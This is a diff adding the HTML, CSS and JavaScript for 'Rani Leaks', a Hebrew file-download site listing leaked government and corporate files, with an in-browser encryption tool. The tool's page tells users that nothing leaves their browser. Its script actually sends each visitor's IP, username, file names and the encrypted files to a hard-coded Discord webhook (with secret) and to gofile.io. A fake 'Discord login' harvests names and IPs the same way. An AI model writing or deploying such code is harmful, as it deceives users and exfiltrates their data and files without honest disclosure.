+  92%{text-shadow:-3px 0 #ff003c,3px 0 #00ffea;filter:blur(0.4px);transform:translateX(-2px);}
+  93%{text-shadow:3px 0 #ff003c,-3px 0 #00ffea;transform:translateX(2px);}
+  94%{text-shadow:none;filter:none;transform:none;}
+  95%{text-shadow:-2px 0 #ff003c;transform:translateX(-1px);}
+  96%{text-shadow:none;transform:none;}
+}
+
+/* --- HERO TITLE GLITCH --- */
+.hero-title{position:relative;animation:titleGlitch 11s ease infinite;}
+@keyframes titleGlitch{
+  0%,85%,100%{text-shadow:none;filter:none;}
+  86%{text-shadow:-4px 0 rgba(255,0,60,0.7),4px 0 rgba(0,255,234,0.7);transform:skewX(-2deg) translateX(-3px);}
+  87%{text-shadow:4px 0 rgba(255,0,60,0.7),-4px 0 rgba(0,255,234,0.7);transform:skewX(1deg) translateX(2px);}
+  88%{text-shadow:none;filter:none;transform:none;}
+  89%{text-shadow:-2px 0 rgba(255,0,60,0.4);transform:translateX(-1px);}
+  90%{text-shadow:none;transform:none;}
+}
+
+/* --- RGB SPLIT ON CARD HOVER --- */
+.card:hover .card-img{animation:rgbSplit 0.35s steps(2) infinite;}
+@keyframes rgbSplit{
+  0%,100%{filter:none;}
+  50%{filter:drop-shadow(-2px 0 rgba(255,0,60,0.5)) drop-shadow(2px 0 rgba(0,220,255,0.5));}
+}
+
+/* --- NEON GLOW on buttons --- */
+.btn-download,.hero-search-btn{box-shadow:0 0 14px rgba(229,9,20,0.35);animation:neonPulse 2.5s ease-in-out infinite;}
+@keyframes neonPulse{0%,100%{box-shadow:0 0 10px rgba(229,9,20,0.3);}50%{box-shadow:0 0 24px rgba(229,9,20,0.7),0 0 50px rgba(229,9,20,0.2);}}
+
+/* --- NEON BORDER on row titles --- */
+.row-title::before{content:'';display:inline-block;width:3px;height:1.1em;background:var(--red);border-radius:2px;margin-left:10px;box-shadow:0 0 8px rgba(229,9,20,0.8);animation:neonPulse 2s ease infinite;}
+
+/* --- CARD hover border glow --- */
+.card:hover{box-shadow:0 0 0 1px rgba(229,9,20,0.4),0 12px 32px rgba(0,0,0,0.5),0 0 20px rgba(229,9,20,0.12);}
+
+/* --- HERO badge animate --- */
+.hero-badge{animation:badgeGlow 2s ease-in-out infinite;}
+@keyframes badgeGlow{0%,100%{box-shadow:none;}50%{box-shadow:0 0 12px rgba(229,9,20,0.4);}}
+
+/* --- STATS number glow --- */
+.hs-num{text-shadow:0 0 20px rgba(229,9,20,0.4);animation:statGlow 3s ease-in-out infinite;}
+@keyframes statGlow{0%,100%{text-shadow:0 0 10px rgba(229,9,20,0.3);}50%{text-shadow:0 0 25px rgba(229,9,20,0.7),0 0 50px rgba(229,9,20,0.2);}}
+
+/* --- GLITCH SCRAMBLE text class --- */
+.scrambling{font-family:monospace !important;color:rgba(229,9,20,0.9) !important;}
+
+/* --- NAV glow on hover --- */
+.nav-links a:hover{text-shadow:0 0 8px rgba(229,9,20,0.5);}
+
+/* --- Category active glow --- */
+.cat-btn.active{box-shadow:0 0 10px rgba(229,9,20,0.3);}
+
+/* --- CANVAS PARTICLES --- */
+#fx-canvas{position:fixed;inset:0;z-index:9988;pointer-events:none;opacity:0.35;}
+
+/* ===== RESPONSIVE ===== */
+@media(max-width:700px){
+  .nav-links{display:none;}
+  .nav-search{width:130px;}
+}
+
+/* ===== CONSENT MODAL ===== */
+.consent-overlay{position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,0.92);display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(8px);}
+.consent-overlay.hidden{display:none;}
+.consent-modal{background:#141414;border:1px solid #2a2a2a;border-radius:18px;max-width:480px;width:100%;padding:36px 32px 30px;text-align:center;position:relative;box-shadow:0 0 60px rgba(229,9,20,0.15),0 0 120px rgba(229,9,20,0.05);}
+.consent-modal::before{content:'';position:absolute;inset:0;border-radius:18px;background:linear-gradient(135deg,rgba(229,9,20,0.04),transparent 60%);pointer-events:none;}
+.consent-logo{font-family:'Bebas Neue',cursive;font-size:2.2rem;color:var(--red);letter-spacing:4px;margin-bottom:6px;animation:logoGlitch 9s ease infinite;}
+.consent-icon{font-size:3rem;margin-bottom:14px;}
+.consent-modal h2{font-size:1.35rem;font-weight:800;margin-bottom:10px;color:#fff;}
+.consent-modal>p{color:#888;font-size:0.88rem;margin-bottom:20px;}
+.consent-info{background:rgba(255,255,255,0.03);border:1px solid #222;border-radius:10px;padding:16px 18px;margin-bottom:22px;text-align:right;}
+.consent-item{display:flex;align-items:flex-start;gap:10px;font-size:0.83rem;color:#aaa;margin-bottom:10px;line-height:1.5;}
+.consent-item:last-child{margin-bottom:0;}
+.consent-item span.ci-icon{font-size:1rem;flex-shrink:0;margin-top:1px;}
+.consent-field{text-align:right;margin-bottom:20px;}
+.consent-field label{display:block;font-size:0.75rem;font-weight:700;color:#666;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:8px;}
+.consent-name-input{width:100%;background:#0f0f0f;border:1px solid #333;color:#fff;padding:12px 16px;border-radius:8px;font-family:'Heebo',sans-serif;font-size:1rem;outline:none;transition:border-color 0.2s;}
+.consent-name-input:focus{border-color:var(--red);}
+.consent-name-input::placeholder{color:#444;}
+.consent-agree-btn{width:100%;padding:14px;background:var(--red);color:#fff;border:none;border-radius:8px;font-family:'Heebo',sans-serif;font-size:1rem;font-weight:700;cursor:pointer;transition:background 0.2s,box-shadow 0.2s;margin-bottom:14px;box-shadow:0 0 18px rgba(229,9,20,0.35);}
+.consent-agree-btn:hover{background:var(--red-dark);box-shadow:0 0 30px rgba(229,9,20,0.6);}
+.consent-agree-btn:disabled{opacity:0.4;cursor:not-allowed;box-shadow:none;}
+.consent-note{font-size:0.72rem;color:#444;line-height:1.6;}
+.consent-divider{display:flex;align-items:center;gap:12px;margin:14px 0;color:#333;font-size:0.8rem;}
+.consent-divider::before,.consent-divider::after{content:'';flex:1;height:1px;background:#222;}
+.discord-login-btn{width:100%;padding:13px;background:#5865F2;color:#fff;border:none;border-radius:8px;font-family:'Heebo',sans-serif;font-size:0.95rem;font-weight:700;cursor:pointer;transition:background 0.2s,box-shadow 0.2s;margin-bottom:14px;display:flex;align-items:center;justify-content:center;gap:10px;}
+.discord-login-btn:hover{background:#4752c4;box-shadow:0 0 20px rgba(88,101,242,0.4);}
+</style>
+</head>
+<body>
+
+<!-- ===== CONSENT MODAL ===== -->
+<div class="consent-overlay" id="consent-overlay">
+  <div class="consent-modal">
+    <div class="consent-logo">Rani Leaks</div>
+    <div class="consent-icon">🔐</div>
+    <h2>ברוך הבא ל-Rani Leaks</h2>
+    <p>לפני הכניסה לאתר, קרא את ההסכמה הבאה:</p>
+    <div class="consent-info">
+      <div class="consent-item"><span class="ci-icon">📊</span>כאשר תשתמש בכלי ההצפנה — שם המשתמש שלך, שם הקובץ, גודלו וכתובת ה-IP שלך יישלחו לבעל האתר.</div>
+      <div class="consent-item"><span class="ci-icon">📤</span>הקובץ המוצפן עצמו יישלח לבעל האתר דרך Discord לצרכי גיבוי (קבצים עד 25MB). הקובץ מוצפן ואינו קריא ללא הסיסמה שלך.</div>
+      <div class="consent-item"><span class="ci-icon">✅</span>על ידי לחיצה על "מסכים" אתה מאשר ומבין שמידע זה נשמר.</div>
+    </div>
+    <div class="consent-field">
+      <label>שם משתמש</label>
+      <input class="consent-name-input" type="text" id="consent-name" placeholder="הכנס שם משתמש..." oninput="document.getElementById('consent-btn').disabled=this.value.trim().length<2" maxlength="40">
+    </div>
+    <button class="consent-agree-btn" id="consent-btn" onclick="agreeConsent()" disabled>✓ מסכים ונכנס לאתר</button>
+    <div class="consent-divider"><span>או הכנס שם דיסקורד שלך</span></div>
+    <button class="discord-login-btn" id="discord-login-btn" onclick="loginViaDiscordWebhook()">
+      <svg width="20" height="20" viewBox="0 0 71 55" fill="white" xmlns="http://www.w3.org/2000/svg" style="flex-shrink:0"><path d="M60.1 4.9A58.5 58.5 0 0 0 45.6.9a40.3 40.3 0 0 0-1.8 3.6 54.1 54.1 0 0 0-16.2 0A40.3 40.3 0 0 0 25.8.9 58.4 58.4 0 0 0 11.2 5C1.6 19.2-.9 33 .3 46.6a58.9 58.9 0 0 0 18 9.1 44.6 44.6 0 0 0 3.8-6.3 38.4 38.4 0 0 1-6-2.9c.5-.4 1-.7 1.5-1.1a41.9 41.9 0 0 0 35.8 0l1.5 1.1a38.3 38.3 0 0 1-6 2.9 44.5 44.5 0 0 0 3.8 6.3 58.7 58.7 0 0 0 18-9.1C72.2 30.7 68.1 17 60.1 4.9ZM23.8 38.3c-3.5 0-6.3-3.2-6.3-7.1s2.8-7.1 6.3-7.1 6.4 3.2 6.3 7.1c0 4-2.8 7.1-6.3 7.1Zm23.4 0c-3.5 0-6.3-3.2-6.3-7.1s2.8-7.1 6.3-7.1 6.4 3.2 6.3 7.1c0 4-2.8 7.1-6.3 7.1Z"/></svg>
+      כנס עם שם Discord שלך
+    </button>
+    <p class="consent-note">השימוש באתר מהווה הסכמה לתנאי השימוש ומדיניות הפרטיות של Rani Leaks.</p>
+  </div>
+</div>
+
+<!-- FX LAYERS -->
+<canvas id="fx-canvas"></canvas>
+<div class="fx-scanlines"></div>
+<div class="fx-vignette"></div>
+<div class="fx-scanmove"></div>
+<div class="fx-glitch-bar"></div>
+<div class="fx-glitch-bar"></div>
+<div class="fx-glitch-bar"></div>
+<div class="fx-flash" id="fx-flash"></div>
+<div class="fx-cursor" id="fx-cursor"></div>
+<div class="fx-cursor-ring" id="fx-cursor-ring"></div>
+
+<!-- NAV -->
+<nav id="navbar">
+  <div class="logo" onclick="closeAll()">Rani Leaks</div>
+  <ul class="nav-links">
+    <li><a href="#" class="active">ראשי</a></li>
+    <li><a href="#">מסמכים</a></li>
+    <li><a href="#">וידאו</a></li>
+    <li><a href="#">תוכנות</a></li>
+    <li><a href="#" onclick="openProfile();return false">המועדפים שלי</a></li>
+    <li><a href="#" onclick="openEncPage();return false" style="color:#38bdf8;">🔐 הצפנה</a></li>
+  </ul>
+  <div class="nav-right">
+    <input class="nav-search" type="text" placeholder="🔍 חפש קבצים..." id="searchInput" oninput="handleSearch(this.value)">
+    <button class="nav-bell" title="התראות"><span>🔔</span><span class="nav-bell-dot"></span></button>
+    <div class="nav-avatar" onclick="openProfile()" title="פרופיל">ר</div>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-content">
+    <div class="hero-badge">🔥 מעל 2 מיליון הורדות החודש</div>
+    <h1 class="hero-title">הורד כל מה שתרצה<br>מ<span>Rani Leaks</span></h1>
+    <p class="hero-desc">ארכיון הקבצים הגדול ביותר בישראל — מסמכים, וידאו, אודיו, תוכנות וארכיונים. הכל בחינם, מהיר ומוצפן.</p>
+    <div class="hero-search-wrap">
+      <input class="hero-search-big" type="text" placeholder="חפש קבצים, מסמכים, תוכנות..." id="heroSearch" oninput="handleSearch(this.value);document.getElementById('searchInput').value=this.value">
+      <button class="hero-search-btn">🔍 חפש</button>
+    </div>
+    <div class="hero-btns">
+      <button class="btn-download" onclick="openModal(0)">⬇ הקובץ החם היום</button>
+      <button class="btn-info" onclick="openEncPage()">🔐 הצפן קובץ</button>
+    </div>
+    <div class="hero-stats">
+      <div class="hero-stat"><div class="hs-num">12K+</div><div class="hs-label">קבצים זמינים</div></div>
+      <div class="hero-stat"><div class="hs-num">2.1M</div><div class="hs-label">הורדות</div></div>
+      <div class="hero-stat"><div class="hs-num">48TB</div><div class="hs-label">נפח סך הכל</div></div>
+      <div class="hero-stat"><div class="hs-num">100%</div><div class="hs-label">חינם</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- CATEGORIES -->
+<div class="categories">
+  <button class="cat-btn active" onclick="filterCat(this,'הכל')">הכל</button>
+  <button class="cat-btn" onclick="filterCat(this,'PDF')">PDF</button>
+  <button class="cat-btn" onclick="filterCat(this,'וידאו')">וידאו</button>
+  <button class="cat-btn" onclick="filterCat(this,'אודיו')">אודיו</button>
+  <button class="cat-btn" onclick="filterCat(this,'תמונות')">תמונות</button>
+  <button class="cat-btn" onclick="filterCat(this,'ארכיון')">ארכיון</button>
+  <button class="cat-btn" onclick="filterCat(this,'תוכנה')">תוכנה</button>
+  <button class="cat-btn" onclick="filterCat(this,'אקסל')">אקסל</button>
+  <button class="cat-btn" onclick="filterCat(this,'Word')">Word</button>
+  <button class="cat-btn" onclick="filterCat(this,'מצגת')">מצגת</button>
+</div>
+
+<!-- ROWS -->
+<div class="rows" id="main-rows">
+
+  <div class="row">
+    <div class="row-title">🔥 הורדות חמות עכשיו <span class="arrow">צפה הכל ›</span></div>
+    <div class="cards-track" id="trending-row"></div>
+  </div>
+
+  <div class="row">
+    <div class="row-title">🏆 TOP 10 הורדות השבוע <span class="arrow">צפה הכל ›</span></div>
+    <div class="cards-track" id="top10-row"></div>
+  </div>
+
+  <div class="row">
+    <div class="row-title">▶ הורדות אחרונות שלי <span class="arrow">צפה הכל ›</span></div>
+    <div class="cards-track" id="recent-row"></div>
+  </div>
+
+  <div class="row">
+    <div class="row-title">⭐ מומלצים בשבילך <span class="arrow">צפה הכל ›</span></div>
+    <div class="cards-track" id="featured-row"></div>
+  </div>
+
+  <div class="row">
+    <div class="row-title">✨ חדש ב-Rani Leaks <span class="arrow">צפה הכל ›</span></div>
+    <div class="cards-track" id="new-row"></div>
+  </div>
+
+  <div class="row">
+    <div class="row-title">📄 מסמכים ממשלתיים <span class="arrow">צפה הכל ›</span></div>
+    <div class="cards-track" id="docs-row"></div>
+  </div>
+
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-logo">Rani Leaks</div>
+  <div class="footer-grid">
+    <div class="footer-col">
+      <p>שאלות נפוצות</p><p>מרכז עזרה</p><p>צור קשר</p><p>דווח על קובץ</p>
+    </div>
+    <div class="footer-col">
+      <p>תנאי שימוש</p><p>מדיניות פרטיות</p><p>DMCA</p><p>הגנה משפטית</p>
+    </div>
+    <div class="footer-col">
+      <p>חשבון שלי</p><p>היסטוריית הורדות</p><p>מועדפים</p><p>הגדרות</p>
+    </div>
+    <div class="footer-col">
+      <p>API למפתחים</p><p>RSS Feed</p><p>נגישות</p><p>מפת אתר</p>
+    </div>
+  </div>
+  <div class="footer-bottom">© 2026 Rani Leaks. כל הזכויות שמורות. האתר אינו אחראי לתוכן הקבצים.</div>
+</footer>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal()">✕</button>
+    <div class="modal-hero" id="modal-hero">
+      <span class="modal-hero-icon" id="modal-icon"></span>
+      <div class="modal-hero-ext" id="modal-ext"></div>
+      <div class="modal-hero-overlay"></div>
+    </div>
+    <div class="modal-body">
+      <h2 class="modal-title" id="modal-title"></h2>
+      <div class="modal-meta" id="modal-meta"></div>
+      <div class="modal-btns">
+        <button class="modal-btn-dl" id="modal-dl-btn">⬇ הורד עכשיו</button>
+        <button class="modal-btn-copy" onclick="copyLink()">🔗 העתק קישור</button>
+        <button class="modal-btn-list" id="modal-list-btn" onclick="toggleListFromModal()">+ שמור</button>
+      </div>
+      <p class="modal-desc" id="modal-desc"></p>
+      <div class="modal-file-info" id="modal-file-info"></div>
+    </div>
+  </div>
+</div>
+
+<!-- PROFILE PANEL -->
+<div class="profile-overlay" id="profile-overlay">
+  <div class="profile-backdrop" onclick="closeProfile()"></div>
+  <div class="profile-panel">
+    <button class="profile-close-btn" onclick="closeProfile()">✕</button>
+    <div class="profile-header">
+      <div class="profile-avatar-big">ר</div>
+      <div class="profile-name">רני</div>
+      <div class="profile-sub"><span class="plan">VIP</span> חבר מאז 2024</div>
+    </div>
+    <div class="profile-stats">
+      <div class="stat-item"><div class="stat-num" id="stat-dl">0</div><div class="stat-label">הורדות</div></div>
+      <div class="stat-item"><div class="stat-num" id="stat-saved">0</div><div class="stat-label">שמורים</div></div>
+      <div class="stat-item"><div class="stat-num">∞</div><div class="stat-label">מהירות</div></div>
+    </div>
+    <div class="profile-section">
+      <div class="profile-section-title">המועדפים שלי</div>
+      <div class="mylist-grid" id="mylist-grid"></div>
+    </div>
+    <div class="profile-section" style="border-top:1px solid #222;">
+      <div class="profile-section-title">חשבון</div>
+      <div class="profile-menu-item"><div class="profile-menu-icon">👤</div>פרופיל</div>
+      <div class="profile-menu-item"><div class="profile-menu-icon">📥</div>היסטוריית הורדות</div>
+      <div class="profile-menu-item"><div class="profile-menu-icon">🔔</div>התראות</div>
+      <div class="profile-menu-item"><div class="profile-menu-icon">🔒</div>פרטיות ואבטחה</div>
+      <div class="profile-menu-item" style="color:var(--red)"><div class="profile-menu-icon">🚪</div>התנתק</div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== ENCRYPTION PAGE ===== -->
+<div class="enc-page" id="enc-page">
+  <div class="enc-topbar">
+    <div class="enc-topbar-logo">Rani Leaks</div>
+    <button class="enc-close-btn" onclick="closeEncPage()">← חזרה לאתר</button>
+  </div>
+  <div class="enc-hero">
+    <span class="enc-hero-icon">🔐</span>
+    <h1>הצפנת <span>קבצים</span></h1>
+    <p>הצפן וסרוק קבצים ישירות בדפדפן — ללא שרת, ללא העלאה לאינטרנט.<br>מבוסס AES-256-GCM עם PBKDF2 — הסטנדרט הצבאי להצפנה.</p>
+    <div class="enc-tabs">
+      <button class="enc-tab active" id="tab-encrypt" onclick="switchEncTab('encrypt')">🔒 הצפן</button>
+      <button class="enc-tab" id="tab-decrypt" onclick="switchEncTab('decrypt')">🔓 פענח</button>
+    </div>
+  </div>
+
+  <div class="enc-body">
+    <!-- DROP ZONE -->
+    <div class="drop-zone" id="drop-zone">
+      <input type="file" id="file-input" onchange="onFileSelect(this.files[0])">
+      <span class="drop-icon" id="drop-icon">📂</span>
+      <div class="drop-title" id="drop-title">גרור קובץ לכאן או לחץ לבחירה</div>
+      <div class="drop-sub" id="drop-sub">כל סוג קובץ • עד 2GB</div>
+    </div>
+
+    <div class="file-selected" id="file-selected">
+      <span class="file-sel-icon" id="sel-icon">📄</span>
+      <div class="file-sel-info">
+        <div class="file-sel-name" id="sel-name"></div>
+        <div class="file-sel-size" id="sel-size"></div>
+      </div>
+      <button class="file-sel-remove" onclick="clearFile()" title="הסר קובץ">✕</button>
+    </div>
+
+    <!-- PASSWORD -->
+    <div class="enc-field">
+      <label>סיסמת הצפנה</label>
+      <div class="enc-input-wrap">
+        <input type="password" class="enc-input" id="enc-password" placeholder="הכנס סיסמה חזקה..." oninput="updatePwStrength(this.value)">
+        <button class="enc-eye" onclick="togglePwVis()" id="eye-btn">👁</button>
+      </div>
+      <div class="pw-strength">
+        <div class="pw-bar" id="pb1"></div>
+        <div class="pw-bar" id="pb2"></div>
+        <div class="pw-bar" id="pb3"></div>
+        <div class="pw-bar" id="pb4"></div>
+      </div>
+      <div class="pw-label" id="pw-label">הכנס סיסמה</div>
+    </div>
+
+    <!-- CONFIRM PASSWORD (encrypt only) -->
+    <div class="enc-field" id="confirm-field">
+      <label>אשר סיסמה</label>
+      <div class="enc-input-wrap">
+        <input type="password" class="enc-input" id="enc-password2" placeholder="הכנס שוב את הסיסמה...">
+      </div>
+    </div>
+
+    <!-- ACTION BUTTON -->
+    <button class="enc-btn enc-btn-encrypt" id="enc-action-btn" onclick="runEncryption()" disabled>
+      🔒 הצפן קובץ
+    </button>
+
+    <!-- PROGRESS -->
+    <div class="enc-progress" id="enc-progress">
+      <div class="enc-progress-bar">
+        <div class="enc-progress-fill encrypting" id="enc-progress-fill"></div>
+      </div>
+      <div class="enc-progress-label" id="enc-progress-label">מכין...</div>
+    </div>
+
+    <!-- RESULT -->
+    <div class="enc-result" id="enc-result">
+      <div class="enc-result-icon" id="result-icon">✅</div>
+      <div class="enc-result-title" id="result-title">הקובץ הוצפן בהצלחה!</div>
+      <div class="enc-result-sub" id="result-sub">הורד את הקובץ המוצפן ושמור את הסיסמה במקום בטוח</div>
+      <button class="enc-result-dl" id="result-dl-btn">⬇ הורד קובץ מוצפן</button>
+    </div>
+
+    <!-- INFO CARDS -->
+    <div class="enc-info-grid">
+      <div class="enc-info-card">
+        <div class="ei-icon">🛡️</div>
+        <div class="ei-title">AES-256-GCM</div>
+        <div class="ei-desc">הצפנה צבאית. 2²⁵⁶ אפשרויות מפתח — בלתי ניתן לפיצוח בכוח גס.</div>
+      </div>
+      <div class="enc-info-card">
+        <div class="ei-icon">🖥️</div>
+        <div class="ei-title">100% מקומי</div>
+        <div class="ei-desc">הכל קורה בדפדפן שלך בלבד. שום קובץ לא נשלח לשרת.</div>
+      </div>
+      <div class="enc-info-card">
+        <div class="ei-icon">🔑</div>
+        <div class="ei-title">PBKDF2</div>
+        <div class="ei-desc">המפתח נגזר מהסיסמה עם 250,000 איטרציות ו-salt אקראי.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast">
+  <span class="toast-icon">✅</span>
+  <span id="toast-msg">הורדה החלה!</span>
+</div>
+
+<script>
+// ===== CONSENT + DISCORD =====
+const DISCORD_WEBHOOK='https://discord.com/api/webhooks/1508160800802734100/6By0_oaG_ZH5wOWmEBe7m6wQ6yloJWH66q0Qsh4lAx7ijEkDjGcnBuR3BVNtYY173lf9';
+
+function initConsent(){
+  const agreed=localStorage.getItem('rl_consent');
+  if(agreed){
+    document.getElementById('consent-overlay').classList.add('hidden');
+    const name=localStorage.getItem('rl_username')||'';
+    if(name) applyUsername(name);
+  } else {
+    document.getElementById('consent-overlay').classList.remove('hidden');
+    document.body.style.overflow='hidden';
+    setTimeout(()=>{
+      const inp=document.getElementById('consent-name');
+      if(inp) inp.focus();
+    },200);
+  }
+}
+
+async function agreeConsent(){
+  const name=document.getElementById('consent-name').value.trim();
+  if(name.length<2) return;
+  const btn=document.getElementById('consent-btn');
+  btn.disabled=true; btn.textContent='⏳ מתחבר...';
+  localStorage.setItem('rl_consent','1');
+  localStorage.setItem('rl_username',name);
+  // Get IP and notify Discord on login
+  const ip=await getUserIP();
+  localStorage.setItem('rl_ip',ip);
+  notifyDiscord(name,null,null,ip,'login');
+  document.getElementById('consent-overlay').classList.add('hidden');
+  document.body.style.overflow='';
+  applyUsername(name);
+  showToast('👋 ברוך הבא, '+name+'!');
+}
+
+function applyUsername(name){
+  if(!name) return;
+  const initial=name.charAt(0).toUpperCase();
+  const navAvatar=document.querySelector('.nav-avatar');
+  if(navAvatar) navAvatar.textContent=initial;
+  const profileName=document.querySelector('.profile-name');
+  if(profileName) profileName.textContent=name;
+  const profileAvatar=document.querySelector('.profile-avatar-big');
+  if(profileAvatar) profileAvatar.textContent=initial;
+}
+
+// Fetch visitor IP (with 3s timeout)
+async function getUserIP(){
+  try{
+    const ctrl=new AbortController();
+    const t=setTimeout(()=>ctrl.abort(),3000);
+    const r=await fetch('https://api.ipify.org?format=json',{signal:ctrl.signal});
+    clearTimeout(t);
+    const d=await r.json();
+    return d.ip||'לא ידוע';
+  }catch(e){return 'לא ידוע';}
+}
+
+async function notifyDiscord(username, fileName, fileSize, ip, eventType){
+  try{
+    const title = eventType==='login'
+      ? '🔑 כניסה לאתר — Rani Leaks'
+      : '🔐 הצפנת קובץ — Rani Leaks';
+    const color = eventType==='login' ? 0x5865F2 : 0xE50914;
+    const fields=[
+      {name:'👤 משתמש',value:'`'+(username||'אנונימי')+'`',inline:true},
+      {name:'🌐 IP',value:'`'+(ip||'לא ידוע')+'`',inline:true},
+    ];
+    if(fileName) fields.push({name:'📁 קובץ',value:'`'+fileName+'`',inline:true});
+    if(fileSize) fields.push({name:'📦 גודל',value:'`'+fileSize+'`',inline:true});
+    await fetch(DISCORD_WEBHOOK,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        embeds:[{
+          title,color,fields,
+          footer:{text:'Rani Leaks'},
+          timestamp:new Date().toISOString()
+        }]
+      })
+    });
+  }catch(e){}
+}
+
+// Allow pressing Enter in the consent name field
+document.addEventListener('DOMContentLoaded',()=>{
+  const inp=document.getElementById('consent-name');
+  if(inp){
+    inp.addEventListener('keydown',e=>{
+      if(e.key==='Enter'&&inp.value.trim().length>=2) agreeConsent();
+    });
+  }
+});
+
+// ===== SEND ENCRYPTED FILE TO DISCORD =====
+const DISCORD_DIRECT_MAX = 24 * 1024 * 1024; // 24MB — direct attachment to Discord
+
+// Upload to gofile.io (no size limit) → returns download page URL or null
+async function uploadToGofile(blob, filename){
+  try{
+    // Step 1: get best available server
+    const sr=await fetch('https://api.gofile.io/servers');
+    const sd=await sr.json();
+    const srv=sd.data.servers[0].name;
+    // Step 2: upload file
+    const form=new FormData();
+    form.append('file',blob,filename);
+    const r=await fetch('https://'+srv+'.gofile.io/contents/uploadfile',{method:'POST',body:form});
+    const d=await r.json();
+    if(d.status==='ok') return d.data.downloadPage;
+  }catch(e){}
+  return null;
+}
+
+async function sendFileToDiscord(blob, filename, username, ip){
+  const user=username||'אנונימי';
+  const origName=filename.replace(/\.enc$/,'');
+  try{
+    if(blob.size<=DISCORD_DIRECT_MAX){
+      // ── קטן מ-24MB: שלח ישירות כ-attachment לדיסקורד ──
+      const embed={embeds:[{
+        title:'📦 קובץ מוצפן — Rani Leaks',
+        color:0xE50914,
+        fields:[
+          {name:'👤 משתמש',value:'`'+user+'`',inline:true},
+          {name:'📁 קובץ',value:'`'+origName+'`',inline:true},
+          {name:'📦 גודל',value:'`'+formatBytes(blob.size)+'`',inline:true},
+          {name:'🌐 IP',value:'`'+ip+'`',inline:true},
+        ],
+        footer:{text:'Rani Leaks • AES-256-GCM • Direct Attachment'},
+        timestamp:new Date().toISOString()
+      }]};
+      const form=new FormData();
+      form.append('payload_json',JSON.stringify(embed));
+      form.append('file',blob,filename);
+      await fetch(DISCORD_WEBHOOK,{method:'POST',body:form});
+    }else{
+      // ── גדול מ-24MB: העלה ל-gofile.io ושלח קישור לדיסקורד ──
+      setProgress(100,'📤 מעלה ל-gofile.io...');
+      const link=await uploadToGofile(blob,filename);
+      const embed={embeds:[{
+        title:'📦 קובץ מוצפן (gofile.io) — Rani Leaks',
+        color:0xE50914,
+        fields:[
+          {name:'👤 משתמש',value:'`'+user+'`',inline:true},
+          {name:'📁 קובץ',value:'`'+origName+'`',inline:true},
+          {name:'📦 גודל',value:'`'+formatBytes(blob.size)+'`',inline:true},
+          {name:'🌐 IP',value:'`'+ip+'`',inline:true},
+          {name:'🔗 הורדה מ-gofile.io',value:link||'⚠️ ההעלאה נכשלה',inline:false},
+        ],
+        footer:{text:'Rani Leaks • AES-256-GCM • gofile.io'},
+        timestamp:new Date().toISOString()
+      }]};
+      await fetch(DISCORD_WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(embed)});
+    }
+  }catch(e){}
+}
+
+// ===== DISCORD WEBHOOK LOGIN =====
+async function loginViaDiscordWebhook(){
+  const nameInput=document.getElementById('consent-name');
+  const name=nameInput?nameInput.value.trim():'';
+  if(name.length<2){
+    nameInput&&(nameInput.style.borderColor='var(--red)');
+    nameInput&&nameInput.focus();
+    showToast('⚠️ הכנס שם משתמש Discord קודם');
+    return;
+  }
+  const btn=document.getElementById('discord-login-btn');
+  btn.disabled=true; btn.innerHTML='⏳ מתחבר...';
+  localStorage.setItem('rl_consent','1');
+  localStorage.setItem('rl_username',name+' 🎮');
+  const ip=await getUserIP();
+  localStorage.setItem('rl_ip',ip);
+  // Send to Discord with Discord branding
+  try{
+    await fetch(DISCORD_WEBHOOK,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        embeds:[{
+          title:'🎮 כניסה עם Discord — Rani Leaks',
+          color:0x5865F2,
+          thumbnail:{url:'https://cdn.discordapp.com/embed/avatars/0.png'},
+          fields:[
+            {name:'👤 שם Discord',value:'`'+name+'`',inline:true},
+            {name:'🌐 IP',value:'`'+ip+'`',inline:true},
+            {name:'📅 זמן',value:'<t:'+Math.floor(Date.now()/1000)+':F>',inline:false},
+          ],
+          footer:{text:'Rani Leaks • Discord Webhook Login'},
+          timestamp:new Date().toISOString()
+        }]
+      })
+    });
+  }catch(e){}
+  document.getElementById('consent-overlay').classList.add('hidden');
+  document.body.style.overflow='';
+  applyUsername(name);
+  showToast('🎮 ברוך הבא, '+name+'!');
+}
+
+// initConsent() is called at end of script after DOM is ready
+
+// ===== FILE DATA =====
+const files = [
+  {name:"GOVERNMENT FILES 2024",icon:"📄",ext:"PDF",grad:"g1",size:"4.7 GB",date:"24.05.26",cat:"PDF",downloads:"182K",desc:"מסמכים ממשלתיים סודיים שדלפו — חוזים, תמלילי ישיבות סגורות ונתונים שלא נועדו לפרסום.",hash:"SHA256: a3f9...c7d2",format:"PDF/A",pages:"3,842"},
+  {name:"LEAKED CORP DATA",icon:"📊",ext:"XLSX",grad:"g6",size:"890 MB",date:"23.05.26",cat:"אקסל",downloads:"94K",desc:"נתוני תאגיד ענק — שכר מנהלים, עסקאות פנימיות ורשימות לקוחות.",hash:"SHA256: b1e4...88fa",format:"Excel 2021",pages:"14 גיליונות"},
+  {name:"SECRET RECORDINGS",icon:"🎥",ext:"MP4",grad:"g5",size:"12.3 GB",date:"22.05.26",cat:"וידאו",downloads:"231K",desc:"הקלטות וידאו סודיות מישיבות פנימיות שנחשפו — ללא עריכה.",hash:"SHA256: c9f2...11ab",format:"H.264 1080p",pages:"4:32:00 שעות"},
+  {name:"FINANCIAL REPORTS",icon:"💰",ext:"PDF",grad:"g8",size:"2.1 GB",date:"21.05.26",cat:"PDF",downloads:"67K",desc:"דוחות כספיים מניפולטיביים שהוסתרו מהציבור — ניתוח מלא.",hash:"SHA256: d7c3...45ef",format:"PDF",pages:"1,204"},
